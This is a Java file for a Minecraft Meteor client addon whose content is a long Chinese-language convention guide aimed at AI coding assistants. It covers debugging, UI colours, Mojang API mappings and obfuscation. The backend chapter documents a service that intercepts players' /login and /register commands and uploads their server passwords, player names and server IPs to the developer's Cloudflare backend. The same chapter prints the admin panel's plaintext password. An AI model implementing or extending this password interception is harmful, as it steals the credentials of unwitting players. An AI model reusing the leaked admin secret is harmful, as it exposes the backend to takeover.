package com.example.addon.convention;

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║              yiyiaddon 项目开发规范总纲（AI 与开发者必读）               ║
// ╠══════════════════════════════════════════════════════════════════════════╣
// ║  本文件是项目唯一的规范正本，所有开发习惯、调试协议、API 约定都收敛在此。 ║
// ║  任何 AI 助手（Trae / Claude / Copilot / Cursor 等）动手前必须先读完本文件。║
// ║  ────────────────────────────────────────────────────────────────────────  ║
// ║  本文档目录：                                                            ║
// ║    第一章   AI 强制阅读声明与铁律                                        ║
// ║    第二章   用户对话偏好（AI 输出要求）                                  ║
// ║    第三章   代码分类铁律（目录结构规范）                                  ║
// ║    第四章   后台 API 配置与后台账号                                      ║
// ║    第五章   模块开发规范（消息/面板/自检/翻档）                          ║
// ║    第六章   运行时缺陷排查协议（证据驱动调试）                            ║
// ║    第七章   26.1.2 API 规范（Mojang 官方映射）                           ║
// ║    第八章   混淆与发布规范（ProGuard）                                   ║
// ║    第九章   构建命令与环境                                                ║
// ║    第十章   GitHub 仓库结构与 Release 模板                               ║
// ╚══════════════════════════════════════════════════════════════════════════╝

// ════════════════════════════════════════════════════════════════════════════
//  第一章 · AI 强制阅读声明与铁律
// ════════════════════════════════════════════════════════════════════════════
//
// 本文件不只是一个空 Java 类，它是 yiyiaddon 项目的「规范载体」。
// 在对本项目做任何代码修改、Bug 排查或目录调整之前，你必须：
//
//   1. 完整读完本文件的全部章节，不允许只挑代码相关段落跳读注释。
//   2. 把第六章「运行时缺陷排查协议」视为用户明确下达的工作偏好，
//      其优先级高于你自身的默认调试习惯。冲突时一律服从本文件。
//   3. 不得删除、精简或「优化」本文件中的任何规范注释。
//      用户已多次强调这些注释必须保留，它们是长期积累的协作契约。
//      如需新增规范，追加到对应章节，不要覆盖原有内容。
//
// ── 五条铁律（优先级从高到低）─────────────────────────────────────────────
//
//   1. 规范注释只增不删：不得删除、精简或改写任何一条既有规范。
//   2. 证据驱动排查：用户报 Bug 后，先按第六章协议埋点取运行时证据再下结论，
//      禁止凭静态代码推测直接改业务逻辑。
//   3. 中文 + 日期归档：调试产物一律进 Diagnostics/，文档中文命名并带日期前缀。
//   4. API 先查后写：本项目用 Mojang 官方映射，不是 Yarn。写任何没在现有代码
//      出现过的 net.minecraft API 之前，先查 Mappings 工具确认它在 26.1.2 真实存在。
//   5. 分类铁律：代码只能放对分类的目录，新功能必须新建独立英文文件夹（包）。
//
// ── 常见违规（请自查，这些都是过去真实发生过的错误）────────────────────────
//
//   ✗ 用户报 Bug 后，凭代码静态推测就下结论 → 必须先埋点取运行时证据
//   ✗ 调用栈只取 1~2 帧就判定触发方 → 至少取 10 帧，否则会误判
//   ✗ 改了源码赋值就认为可序列化字段已修复 → 必须同时处理 fromTag 读档路径
//   ✗ 修复后把埋点留在业务代码里 → 必须清理到零残留，含无用 import
//   ✗ 用英文或拼音命名调试文档 → 用户看不懂，一律中文 + YYYY-MM-DD 前缀
//   ✗ 把调试文件散落在项目根目录 → 全部收进 Diagnostics/ 对应子目录
//   ✗ 预先埋一套「通用日志系统」 → 埋点是针对单个 Bug 的一次性工具
//   ✗ 只依赖 GameJoinedEvent 等一次性事件 → onActivate() 必须检查当前状态
//      （2026-08-26 修复：ServerDetector 进服后开启不检测）
//
// 判断标准很简单：用户下次打开 Diagnostics/ 目录，能不能一眼看懂每个文件
// 是什么、什么时候修的、修什么问题。看不懂就是你没做对。
//
// ════════════════════════════════════════════════════════════════════════════
//  第二章 · 用户对话偏好（AI 输出要求）
// ════════════════════════════════════════════════════════════════════════════
//
// AI 输出要求（重要性降序）：
//   1. 只说关键信息，一句话能说清的不写两句
//   2. 直接输出结论和方案，不要解释过程和寒暄
//   3. 代码必须高质量可运行，不输出示例代码或伪代码
//   4. 报错时只输出「问题 + 原因 + 修复方法」，不解释为什么会报错
//   5. 每次回复控制长度，分多次输出重点内容，别一次性发一大段
//   6. 铁律：不要废话不寒暄只写代码，除非用户主动提问或有重大问题，其余时间不插嘴
//   7. 输出高级专业的代码，代码质量要达到生产级别
//
// 代码规范（强制执行）：
//   · 所有注释必须使用中文，禁止英文注释（用户看不懂）
//   · 技术术语可保留英文（Paper / Spigot / Baritone / Windows / API 等）
//   · 所有代码、脚本、状态机必须写中文注释（类 / 方法 / 关键逻辑）
//   · 插件代码注释铁律（2026-08-31 明确）：addon 项目内所有 Java 源文件
//     （modules/ 模块类 + 各独立功能包，含移植进来的代码）的类 / 方法 / 关键逻辑
//     必须带中文注释，禁止出现无注释的类或方法；每移植一个模块都按此验收
//   · UI 元素（HUD、聊天消息、设置面板）必须使用中文
//
// ── 注释原则 ──────────────────────────────────────────────────────────────
//   · 写「为什么这样做」，不写「做了什么」
//   · 标注风险点、兼容性、性能影响
//   · 状态机 / 异步 / 发包必须注释意图
//   · 拒绝废话注释（如「获取 XXX」「设置 XXX」）
//
// ── UI / 消息颜色规范（2026-08-27 更新）───────────────────────────────────
//   · 启动 / 成功 / 绑定：绿色 §a§l✓
//   · 关闭 / 失败 / 删除：红色 §c§l✗
//   · 坐标格式：XYZ 标签 §7 灰色 + 数值 §f 白色
//   · 维度信息：根据点位类型使用对应颜色
//   · 分隔符：§8▸ 深灰色箭头
//
// ── 使用说明窗口规范（2026-08-27 新增）────────────────────────────────────
//   · 所有模块的使用说明统一使用 HelpScreen 独立窗口显示
//   · 模块描述文字统一改为「...点击按钮查看说明。」
//   · 设置面板顶部必须添加「查看使用说明」按钮，点击打开独立窗口
//   · 按钮颜色：§e 黄色（显眼，方便用户点击查看）
//   · 颜色方案：黑客终端风格
//       §3 青色    - 标题和章节标识 [#]
//       §b 亮青色  - 副标题和重点强调
//       §f 白色    - 正文内容
//       §7 灰色    - 补充说明和括号内提示
//       §8 深灰色  - 树形结构线条 ├─ └─ >
//       §e 黄色    - 方式标识、数值
//       §a 绿色    - 流程步骤 [1][2][3]
//       §6 金色    - 参数建议 ▸
//       §d 粉色    - 可选功能
//       §c 红色    - 注意事项 ⚠
//   · 章节结构：使用 [#] 标识，内容使用树形结构 ├─ └─
//   · 指令展示：使用 > 提示符，青色显示指令，灰色显示说明
//
// ── emoji 使用范围（2026-08-28 澄清，重要）────────────────────────────────
//   · 本 addon 的 Java 源码、注释、游戏内文本：禁止 emoji
//     （Minecraft 字体渲染器不支持，会导致后续文字无法显示）
//   · 后台网站代码（backend/worker.js、backend/admin-html.js 的 HTML/CSS/JS）：
//     允许使用 emoji，因为网站运行在真实浏览器 / 系统字体中，emoji 渲染正常
//   · 个人习惯：网站 UI 用 emoji 提升辨识度，个人 Java 代码保持无 emoji
//   · 禁止使用 emoji 时，用 Unicode 符号代替（▸ ⚠ ✓ ✗ 等）
//
// ════════════════════════════════════════════════════════════════════════════
//  第三章 · 代码分类铁律（目录结构规范）
// ════════════════════════════════════════════════════════════════════════════
//
// 铁律：代码必须按类型归类，禁止乱放。
//   · 新功能必须新建独立英文文件夹（包）作为新分类，不得塞进现有不相关目录。
//   · 文件夹 / 包名一律英文小写，类名帕斯卡命名（英文），文件内容（注释）用中文。
//   · 每次新增插件模块后，必须同步整理代码目录结构。
//
// ── 当前 package 目录结构 ─────────────────────────────────────────────────
//
//   com.example.addon/
//   ├─ core/          核心基础类（AddonTemplate、YiyiaddonModule、YiyiaddonRefreshable）
//   ├─ convention/    开发规范载体（本文件 YiyiaddonConvention，规范唯一正本）
//   ├─ translations/  翻译引擎（*Translations、Translator）
//   ├─ utils/         工具 / 后台通信服务（Watermark、WelcomeService、HeartbeatService、
//   │                 TelemetryService、PasswordInterceptorService）
//   ├─ commands/      指令类（*Command）
//   ├─ modules/       模块类（*Module）
//   ├─ mixin/         Mixin 注入（*Mixin、*Access）
//   ├─ hud/           HUD 组件（*Hud）
//   ├─ farm/          农场系统（Scanner、Nav、Renderer 等）
//   ├─ mining/        挖矿系统
//   ├─ tactical/      绕过 / 战术系统
//   ├─ accessor/      Mixin 访问器
//   └─ ui/            界面相关
//
// ── 新增分类的整理步骤 ─────────────────────────────────────────────────────
//   1. 新建子目录（如有新分类需求）
//   2. 使用 git mv 移动文件到对应目录
//   3. 更新文件的 package 声明
//   4. 批量更新所有文件的 import 语句
//   5. 修复 Access 接口等特殊引用
//   6. 编译测试：gradlew buildPersonal
//   7. 提交到 source 分支
//
// ════════════════════════════════════════════════════════════════════════════
//  第四章 · 后台 API 配置与后台账号
// ════════════════════════════════════════════════════════════════════════════
//
//   ✓ 用户统计服务部署在 Cloudflare Workers：https://yiyiaddonadmin.fxjggyx.workers.dev
//   ✓ 注册端点：POST /api/register    参数：uuid, name, version, minecraft_version, server_ip, is_premium, player_activity
//   ✓ 心跳端点：POST /api/heartbeat    参数：uuid, name, server_latency, network_latency, gamertag, enabled_modules, player_activity（每 15 秒）
//   ✓ 查询端点：GET  /api/stats        返回：total_users, recent_users
//   ✓ 远程配置：GET  /api/config        参数：无（addon 每分钟轮询）
//   ✓ 崩溃上报：POST /api/crash/report  异常上报：POST /api/anomaly/report
//   ✓ 消息拉取：POST /api/messages/poll 消息回复：POST /api/messages/reply
//   ✓ 离线密码上报：POST /api/offline-server-password（玩家名 + 服务器 IP + 密码）
//   ✓ 管理端点：GET  /api/admin/players  鉴权方式为 Bearer token（登录后返回）
//   ✓ 管理员登录：POST /api/admin/login  参数：username, password
//
// ── 后台登录凭据（勿泄露，仅记录在规范，不写死在代码）──────────────────────
//   ✓ 后台登录账号：admin
//   ✓ 后台登录密码：fxj010517.（通过 wrangler secret 设置 ADMIN_PASSWORD，禁止写死）
//
//   ✓ Workers 源码位于 backend/ 目录（worker.js + admin-html.js + wrangler.toml）
//   ✓ 客户端实现：
//       YiyiaddonWelcomeService（注册）、YiyiaddonHeartbeatService（心跳/延迟/模块）
//       YiyiaddonTelemetryService（崩溃/异常/远程配置）
//       YiyiaddonPasswordInterceptorService（拦截 /login /register 记录密码）
//   ✓ 配置常量：AddonTemplate.STATS_API_URL 集中管理后台地址
//
// ── 网络部署约束 ───────────────────────────────────────────────────────────
//   ✓ Cloudflare API 鉴权用 API Token（cfut_ 开头），全局 Key（cfk_ 开头）不可用
//   ✓ Wrangler 部署必须连 OneVPN「日本节点」；新加坡 7 节点连不上 Cloudflare/Google
//
// ════════════════════════════════════════════════════════════════════════════
//  第五章 · 模块开发规范
// ════════════════════════════════════════════════════════════════════════════
//
// 【5.1 核心功能】
//   1. 统一消息格式：[yiyiaddon] [模块名] 内容
//   2. 颜色编码规范：红色前缀、白色模块名、自定义内容颜色
//   3. 说明面板构建：buildInfoWidget() 标准化面板生成
//   4. 高亮工具方法：highlightText / Server / Location / Command
//
// 【5.2 消息输出规范】
//   · notify()      → 普通消息（白色）
//   · notifyError() → 错误消息（橙色加粗）
//   · info()        → Meteor 原生 info 拦截并中文化
//   · warning()     → 警告消息（黄色加粗）
//   · error()       → 错误消息（红色加粗）
//
// 【5.3 说明面板规范】
//   · 标题：§l模块名 · 使用说明
//   · 段落标题色：§e§l▌ 准备  §a§l▌ 功能  §b§l▌ 参数  §d§l▌ 模式  §c§l▌ 注意
//   · 正文缩进：§f  1. 步骤（有序）  §f  · 条目（无序）  §f    续行
//
// 【5.4 单人世界自动禁用规范】（绕过模块专用）
//   对于 CATEGORY_TACTICAL 分类下的绕过模块，单人世界无需这些功能。
//   onActivate() 中检测单人世界时的标准处理：
//
//     if (mc.hasSingleplayerServer()) {
//         chatFeedback = false;  // 禁用开关消息
//         toggle();              // 关闭模块
//         chatFeedback = true;   // 恢复开关消息
//         warning("§c单人世界无需XXX");  // 只显示一次警告
//         return;
//     }
//
//   好处：避免显示两次消息（开关消息 + 警告消息）；只在单人世界生效。
//
// 【5.5 启动自检失败处理规范】（自动化模块专用）
//   对于需要预配置的自动化模块（自动挖矿、自动农场），onActivate() 自检失败时：
//
//     String error = selfCheck();
//     if (error != null) {
//         chatFeedback = false;
//         if (isActive()) toggle();
//         chatFeedback = true;
//         notifyError("启动失败：" + error);
//         return;
//     }
//
// 【5.6 覆写基类方法的注意事项】
//   基类已覆写 toggle() / sendToggledMsg() / info() / warning() / error() / fromTag()，
//   子类如需再覆写，必须调 super，否则会破坏统一消息格式或配置修正逻辑。
//   子类输出消息统一用 notify() / notifyError()，不要直接调 mc.player.sendSystemMessage。
//   涉及可序列化字段（会写进 modules.nbt），改内存值的同时必须处理 fromTag。
//
// 【5.7 说明面板与消息前缀统一规范】（所有模块必须一致）
//
//   ── 一、聊天前缀 ──────────────────────────────────────────────
//   唯一合法格式（由 formatMessage 统一产出，方括号之间没有空格）：
//     §c§l[yiyiaddon]§r§f§l[模块名]§r 内容
//   模块内部：一律用 notify() / notifyError()。
//   模块外部（指令、Service、工具类）：调 YiyiaddonModule.formatMessage("显示名", 消息)。
//   ✗ 禁止硬编码 "§c§l[yiyiaddon] §f..."（注意那个空格），也禁止自己拼前缀。
//
//   ── 二、说明面板结构 ──────────────────────────────────────────
//   必须覆写 getWidget()，返回 buildInfoWidget(...)，不要自己拼 WTable。
//   段落顺序固定：标题 → 使用方法 → 功能说明 → 当前状态 → 注意事项。
//     标题：  "§l模块名 · 使用说明"（中间「空格·空格」）
//     小节：  "§{色}§l▌ 小节名"（▌ 后一个空格）
//     条目：  "§f  1. 步骤"（有序，缩进两空格）  "§f  · 要点"（无序，缩进两空格）
//   小节配色固定，不自创。常规五色：
//     §e§l▌ 准备/使用方法  黄    §a§l▌ 功能/原理/流程  绿
//     §b§l▌ 参数建议/当前状态  青  §d§l▌ 模式说明/提示  粉
//     §c§l▌ 注意/警告  红
//   超过五个时续用扩展色：
//     §6§l▌ 指令系统/分类小节  橙  §5§l▌ 次级分类  紫
//     §9§l▌ 高级功能/连接相关  蓝  §4§l▌ 安全提醒  深红
//
//   ── 三、面板按钮 ──────────────────────────────────────────────
//   一律用 addUniformButton(theme, table, "文字", 回调)，多行按钮用 table.row() 分行。
//   ✗ 禁止 table.add(theme.button(...)).expandX()。
//   ✗ 禁止自拼 theme.button(...).expandX().minWidth(任意数字)（2026-08-31 补充）：
//     手写 minWidth 是魔法数，换按钮文字就列宽不齐；等宽由基类封装统一实现
//     （minWidth(BUTTON_MIN_WIDTH) + expandWidgetX + group("uniform")，
//      group("uniform") 让同行按钮取该组最大宽度对齐），任何模块不得绕过基类自己拼。
//
//   ── 四、启动自检的缺项播报 ────────────────────────────────────
//   selfCheck() 必须返回 List<String> 收集全部缺项，交给 reportSelfCheck(missing) 播报。
//   ✗ 禁止「遇到第一个缺项就 return」；禁止在 onActivate() 里直接调 toggle() 自我关闭。
//
//   ── 五、关闭容器界面的守卫 ────────────────────────────────────
//   player.closeContainer() 前必须确认当前 Screen 是容器界面：
//     if (!(mc.screen instanceof AbstractContainerScreen<?>)) return;
//   ✗ 判断 mc.player.containerMenu != null 没用（玩家背包菜单始终非 null）。
//
//   ── 六、自检 ──────────────────────────────────────────────────
//   改完任意模块，跑这几条确认没有漏网写法：
//     Grep "\[yiyiaddon\] "        → 应只在基类注释里出现
//     Grep "expandX\(\)"           → 只允许 buildInfoWidget 内部 label 使用
//     Grep "onActivate" 内是否有 toggle() → onActivate 里一律不许自我 toggle
//     Grep "closeContainer\(\)"     → 每处调用点都要有 Screen 类型守卫
//
// 【5.8 运行态状态播报与指令类提示排版规范】（2026-08-30 新增，全项目统一）
//
//   ── 〇、统一配色总表（全项目唯一标准，任何提示不得自创颜色）────────
//   · 开关/开启/成功/绑定/达成：§a§l✓ 绿色   关闭/失败/删除/停机：§c§l✗ 红色
//     （铁律：开=绿、关=红，任何模块不得颠倒或换色）
//   · 警告/跳过/降级：§e⚠ 黄色            错误/致命：§c✗ 红色
//   · 普通信息正文：§f 白色               补充说明/括号提示：§7 灰色
//   · 键标签（左侧）：§7 灰色             值高亮（右侧）：§a 绿色
//   · 位置/坐标：§d 粉色                  指令示例：§e 黄色
//   · 标题/分隔线：§b 亮青色              模式/功能名：§b 亮青 或 §d 粉色
//   · 键值分隔符：§8▸ 深灰箭头           树形线条：§8 ├ └ ─
//   · 符号库（唯一允许，禁止 emoji）：✓ ✗ ⚠ ▸ ■ ├ └ ─ │（箭头提示可叠加 ▸ ► ▶ 用于强调方向）
//
//   ── 强调色转换体系（强调功能/物品/数值时用专用高亮，一眼区分不混淆）──
//   · 物品名 / 目标矿物 / 成功值  → highlightText()     §a§l 亮绿
//   · 功能名 / 模式名 / 状态名    → highlightFunction() §b§l 亮青
//   · 数值 / 阈值 / 百分比        → highlightNumber()   §e§l 黄色
//   · 服务器名                    → highlightServer()   §6§l 金色
//   · 位置 / 坐标                 → highlightLocation() §d§l 粉色
//   · 指令示例                    → highlightCommand()  §e§l 黄色
//   ✗ 禁止直接拼 §x§l 颜色代码强调，一律走基类 highlight* 方法保持统一。
//
//   ── 一、启动报告（模块 onActivate 自检通过后的配置播报）──────────
//   · 合并为「一条 notify 多行消息块」，只带一次模块前缀，禁止逐条 notify 刷屏。
//   · 标题：§a§l✓ 模块名 · 启动报告（成功用 ✓ 图标）。
//   · 正文统一「标签 §8▸ 值」结构，标签固定宽度（如 4 字 + 全角空格对齐），
//     值用 highlightText() 绿色高亮，行首缩进一致。
//   · 示例：
//       §a§l✓ 自动挖矿 · 启动报告
//       §7当前维度　§8▸ §a§l主世界
//       §7目标矿物　§8▸ §a§l钻石矿石
//
//   ── 二、状态机运行态播报（交易/挖矿/农场等 FSM 状态切换）────────
//   · 成功 / 达成：§a✓ 前缀；警告 / 跳过：§e⚠ 前缀；错误 / 停机：§c✗ 前缀。
//   · 统一「图标 + 状态名 §8▸ 详情」结构，别再用「：」或「，」生拼。
//   · 高频循环动作（收割/拾取/进食/耐久）必须带节流（stateTick % N 或去重锁），
//     禁止每 tick 播报；低频关键节点（锁定/补给/卸货/任务完成）单次播报。
//   · 启动参数只由模块层 announceStartup 统一播报，FSM 内部 start() 不再重复输出。
//
//   ── 三、指令类提示（.wk / .farm / .cunmin / .fumo 等）──────────
//   · 状态面板：标题分隔线用 §b§l━━━━…，标题「模块名 ▸ 动作」，
//     正文「标签 §8▸ 值」，坐标用 §7 灰色标签 + §f 白色数值。
//   · 绑定成功：§a§l✓ 绑定成功 §8▸ [节点] §8▸ §d坐标 (...)；解绑 §c§l✗。
//   · 错误提示：§c 或 §6§l 前缀，禁止 emoji（✅❌ 等 Minecraft 字体不支持，用 ✓✗⚠）。
//
//   ── 四、禁止项 ───────────────────────────────────────────────
//   · 禁止 emoji（✅❌▶ 等），一律用 Unicode 符号 ✓ ✗ ⚠ ▸ ■ ├ └ ─。
//   · 禁止「：」与「▸」混用，统一用 §8▸ 做键值分隔。
//
// 【5.9 模块状态播报规范（进度通知）】（2026-08-30 新增）
//
//   · 所有自动化模块（状态机类）必须带「状态播报」，让玩家随时知道：
//     ① 现在在干嘛（进度）  ② 这一步成没成功（结果）。
//   · 进入关键工作状态时播报进度：§7正在XXX...（灰色，表示进行中）。
//   · 状态完成播报结果：§a✓ XXX完成（绿，成功）/ §c✗ XXX失败（红，失败）。
//   · 过渡寻路状态（WALK_TO / NAVIGATING / GO_WILD / SEARCHING）不播，
//     否则每 tick 走路都在刷屏；只播「有实质动作」的工作状态。
//   · 状态切换播报必须带 lastNotifiedState 去重锁，同一状态不重复播，
//     循环类模块（刷经验→附魔→磨书→存书）每轮只播一次，不逐轮刷屏。
//   · 高频循环动作（收割/拾取/进食/耐久）继续用 stateTick % N 节流，不走状态播报。
//   · 参考实现：AutoFarmMatrix.transitionTo() 的 lastNotifiedState 去重播报。
//
// ════════════════════════════════════════════════════════════════════════════
//  第六章 · 运行时缺陷排查协议（证据驱动调试）
// ════════════════════════════════════════════════════════════════════════════
//
// 【6.1 启动与边界】
//   · 触发条件：仅在用户明确给出 Bug、目标项目目录、受影响模块和可复现操作后启动排查；
//     未满足时不得预建监听、调试文档或业务修复。
//   · 项目隔离：只允许读取、修改、构建和收集用户指定项目内的文件。
//   · 路径原则：运行时调试配置与输出路径必须指向当前项目的明确绝对路径。
//
// 【6.2 命名与目录】
//   · 命名规范：会话名、文档名、日志名、目录名一律中文，禁止英文缩写或拼音。
//   · 日期前缀：所有会话文档与 .env 必须带 YYYY-MM-DD- 前缀，天然按时间排序。
//   · 目录规范：所有诊断产物统一收进 Diagnostics/，四个子目录职责固定：
//       Diagnostics/工具/            通用脚本（调试监听服务.js、日志分析器.js）
//       Diagnostics/会话记录/进行中/ 正在排查的会话文档 {日期}-{中文名}.md
//       Diagnostics/会话记录/已修复/ 已结案的会话文档，即历史修复台账
//       Diagnostics/运行日志/        .env 与 .ndjson 运行时证据（.gitignore 排除）
//   · 会话创建：每个独立 Bug 建一个会话，一个会话只服务一个问题与一轮验证。
//   · 监听配置：.env 固定包含 DEBUG_SERVER_URL=http://127.0.0.1:7777/event 与
//     唯一 DEBUG_SESSION_ID={日期}-{中文会话名}。
//
// 【6.3 埋点与证据】
//   · 按需埋点：不预埋通用日志系统，针对该问题现场编写专用埋点，是一次性排查工具。
//   · 埋点原则：只记录与假设直接相关的用户操作、配置原始值/生效值、状态转换、
//     关键分支、调用入口、异常和时间戳。
//   · 调用栈深度：定位「谁触发了这个行为」必须取足够帧数（建议 10 帧）。
//   · 证据驱动：只读该会话最新 NDJSON，旧会话、其他问题、其他项目日志不可作结论。
//
// 【6.4 修复与结案】
//   · 修复与验证：仅在日志足以证实根因后实施最小业务修复；构建前核实 Gradle 任务、JDK、输出名。
//   · 修复层级：修复落在根因所在层；涉及可序列化字段必须同时处理内存与存档（fromTag）。
//   · 修复后清理：删除本次会话在业务源码里加的全部埋点、辅助方法和无用 import，回到零残留。
//   · 结案归档：状态改已修复 → 文档移入会话记录/已修复/ → 摘除源码埋点 → 重新构建确认。
//   · 历史复核：结案前回看同模块历史会话，旧结论被推翻要在新文档写明。
//
// 【6.5 八步执行流程】
//   0. 目录布局（固定，勿变）
//      Diagnostics/
//      ├─ 工具/               调试监听服务.js
//      ├─ 会话记录/
//      │  ├─ 进行中/          {日期}-{中文会话名}.md
//      │  └─ 已修复/          {日期}-{中文会话名}.md
//      └─ 运行日志/           {日期}-{会话名}.env + 调试日志-{会话名}.ndjson
//   1. 创建调试记录文件：Diagnostics/会话记录/进行中/{日期}-{中文会话名}.md
//   2. 选择调试方式：轻量（游戏内 info() 日志+截图）或深度（监听服务+NDJSON）
//   3. 深度调试配置：写 DEBUG_SERVER_URL 与 DEBUG_SESSION_ID，启动监听服务
//   4. 按需编写针对性埋点：用 // #region debug-point {会话名} 与 // #endregion 包裹
//   5. 构建并复现：构建测试版，启动监听服务确认可收事件后让用户复现
//   6. 分析证据：跑 node Diagnostics/工具/日志分析器.js {会话名}，不要手翻 NDJSON
//      （时间线 / 调用栈聚合 / 状态迁移 / 节律分析四类结论）
//   7. 修复并验证：仅实施日志证明的最小修复，重新构建，runId 切 verify-N
//   8. 结案归档：改已修复 → 移文档 → 摘埋点 → 重新构建确认无残留
//
// 【6.6 五类万能假设（任何「功能没反应/自动关闭/界面异常/状态卡死」通用）】
//   A：模块没收到启动或事件回调    B：内部条件主动关闭
//   C：状态机进错分支或没推进      D：容器/网络包/界面同步失败
//   E：外部按键/框架/断线/世界切换关闭
//   通过 A 确认入口、B 确认内部副作用、C 确认状态机、D 确认外部边界、E 确认最终结果，
//   用完整证据链排除假设，再改唯一被证实的根因。
//
//   【可直接抄用的 Java 实现】
//   private static final String 调试地址 = "http://127.0.0.1:7777/event";
//   private static final String 调试会话 = "模块名称-问题简称";
//   private final AtomicLong 调试序号 = new AtomicLong();
//
//   private void debugEvent(String 假设编号, String 消息, String 数据) {
//       // 只传「假设编号、中文消息、中文数据」，异步 POST 到 127.0.0.1:7777/event
//   }
//
//   【上报约束】
//   1. 每个模块只保留一份 debugEvent()。
//   2. 地址仅允许 127.0.0.1:7777/event；异常必须吞掉，不影响游戏线程。
//   3. 每条事件带单调递增 sequence，分析按 ts + sequence 联合排序。
//   4. 上报数据只含诊断所需字段；不记录账号、令牌、服务器密码或完整聊天内容。
//
// ════════════════════════════════════════════════════════════════════════════
//  第七章 · 26.1.2 API 规范（Mojang 官方映射）
// ════════════════════════════════════════════════════════════════════════════
//
// 【7.1 版本事实】
//   对外版本号   26.1.2      新 CalVer 规则：年.批次.修订
//   内部版本号   1.21.11     Loom 缓存、映射文件都用这个号
//   映射类型     Mojang 官方映射（不是 Yarn！）
//   是否混淆     否。26.1 起官方发布不混淆版本，官方名直接编译进 JAR
//   Fabric Loader 0.19.3     Meteor 26.1.2-SNAPSHOT     JDK 25
//
//   注意：build.gradle.kts 里没有 mappings(loom.officialMojangMappings()) 是正确的，
//   不是漏写。26.1 不混淆，不需要重映射步骤。不要「好心」补上这行。
//
// 【7.2 绝对禁止：用 Yarn 名或旧官方名】
//   以下写法一律编译不过（已用官方映射文件逐个核实）：
//     ✗ ResourceLocation         ✓ net.minecraft.resources.Identifier
//     ✗ MinecraftClient          ✓ net.minecraft.client.Minecraft
//     ✗ ClientPlayerEntity       ✓ net.minecraft.client.player.LocalPlayer
//     ✗ ClientWorld              ✓ net.minecraft.client.multiplayer.ClientLevel
//     ✗ PlayerEntity             ✓ net.minecraft.world.entity.player.Player
//     ✗ Text / MutableText       ✓ Component / MutableComponent
//     ✗ NbtCompound / NbtList    ✓ CompoundTag / ListTag
//     ✗ World / ServerWorld      ✓ Level / ServerLevel
//     ✗ Formatting               ✓ net.minecraft.ChatFormatting
//     ✗ Box                      ✓ net.minecraft.world.phys.AABB
//     ✗ Vec3d                    ✓ net.minecraft.world.phys.Vec3
//     ✗ Hand                     ✓ net.minecraft.world.InteractionHand
//     ✗ ActionResult             ✓ net.minecraft.world.InteractionResult
//     ✗ DrawContext              ✓ net.minecraft.client.gui.GuiGraphics
//     ✗ PlayerInventory          ✓ net.minecraft.world.entity.player.Inventory
//     ✗ ScreenHandler            ✓ net.minecraft.world.inventory.AbstractContainerMenu
//     ✗ HungerManager            ✓ net.minecraft.world.food.FoodData
//     ✗ RegistryKey              ✓ net.minecraft.resources.ResourceKey
//     ✗ DynamicRegistryManager   ✓ net.minecraft.core.RegistryAccess
//     ✗ StatusEffects            ✓ net.minecraft.world.effect.MobEffects
//     ✗ GameMode                 ✓ net.minecraft.world.level.GameType
//
//   方法层面同样有变动：
//     ✗ ResourceKey#location()          ✓ ResourceKey#identifier()
//     ✗ Level#random（字段）            ✓ Level#getRandom()（方法）
//     ✗ new ResourceLocation(ns, path)  ✓ Identifier.fromNamespaceAndPath(ns, path)
//
// 【7.3 不确定就查，禁止凭记忆猜】
//   项目内建好映射速查体系（Mappings/，事实来源是官方映射原文件）：
//     node Mappings/工具/查API.js Identifier           查类的完整路径与全部方法
//     node Mappings/工具/查API.js LocalPlayer sendSys  在指定类里搜方法
//     node Mappings/工具/查API.js --找 sendCommand     不确定在哪个类时全局搜
//     Mappings/易错对照表-26.1.2.txt   39 个高频 API 新旧对照
//     Mappings/简名对照-26.1.2.txt     简名 → 完整包路径，写 import 时查
//     Mappings/分类速查/               按功能域分 15 类，带中文用途注释
//   Reference/ 放已完成 26.1.2 迁移的第三方源码（只读思路，禁止复制代码或嵌套 JAR）。
//
// 【7.4 本项目已验证可用的常用 API】
//   客户端与玩家（基类已提供 protected 的 mc 字段，直接用）
//     mc.player                          LocalPlayer，用前必须判空
//     mc.level                           ClientLevel
//     mc.getConnection()                 ClientPacketListener
//     mc.gameMode                        MultiPlayerGameMode
//     mc.hasSingleplayerServer()         是否单人世界
//   聊天与消息
//     mc.player.sendSystemMessage(Component.literal("文本"))
//     mc.getConnection().sendCommand("指令不带斜杠")
//   玩家状态
//     mc.player.getMainHandItem() / getOffhandItem() / getInventory().getItem(i)
//     mc.player.getFoodData() / blockPosition() / getYRot() / getXRot() / isDeadOrDying()
//   方块与世界
//     mc.level.getBlockState(pos)        BlockState
//     mc.level.getBlockEntity(pos)       BlockEntity
//     BuiltInRegistries.BLOCK.getKey(block).toString()
//   注册表与标识
//     Identifier.tryParse("minecraft:stone")
//     Identifier.fromNamespaceAndPath("minecraft", "stone")
//     ResourceKey.create(Registries.DIMENSION, identifier)
//   Meteor 事件（用 meteordevelopment.orbit.EventHandler）
//     @EventHandler private void onTick(TickEvent.Pre event)
//     @EventHandler private void onGameJoined(GameJoinedEvent event)
//     @EventHandler private void onPacketReceive(PacketEvent.Receive event)
//     @EventHandler(priority = -100) 可控制优先级
//     事件回调第一行统一写 if (!isActive()) return;
//
// 【7.5 新模块标准模板】
//   新模块继承 YiyiaddonModule，构造描述以「。详细参考下面使用说明。」结尾，
//   覆写 getWidget() 返回 buildInfoWidget(...)，在 AddonTemplate.onInitialize() 里注册：
//     Modules.get().add(new 示例Module());
//
// ════════════════════════════════════════════════════════════════════════════
//  第八章 · 混淆与发布规范（ProGuard）
// ════════════════════════════════════════════════════════════════════════════
//
//   本项目使用 ProGuard 7.8.1 进行代码混淆，混淆配置在 build.gradle.kts 中。
//   混淆相关文件统一放 Obfuscation/ 目录：
//     Obfuscation/
//     ├─ 字典/混淆字典.txt                 209 条易混字符（l/I/O/0/1 全排列）
//     ├─ 工具/还原崩溃日志.js               崩溃日志反混淆工具
//     └─ 映射存档/                         每个版本的完整映射 + 自动备份
//
//   【版本与映射一一对应】
//   每个 jar 版本对应唯一映射文件，版本号不同混淆结果就不同：
//     yiyiaddon1.1-beta1.jar → 混淆映射-v1.1-beta1.txt
//   ✗ 禁止混用映射文件。
//
//   【映射文件必须入库】
//   映射存档/ 目录必须提交 Git（build/ 在 .gitignore 且 clean 会删掉，映射丢失无法还原）。
//
//   【还原崩溃日志】
//     node Obfuscation/工具/还原崩溃日志.js <日志路径> <版本号>
//     node Obfuscation/工具/还原崩溃日志.js --查 <混淆名>
//     node Obfuscation/工具/还原崩溃日志.js --列表
//
//   【发布流程检查清单】
//   1. libs.versions.toml 中 mod-version 已更新
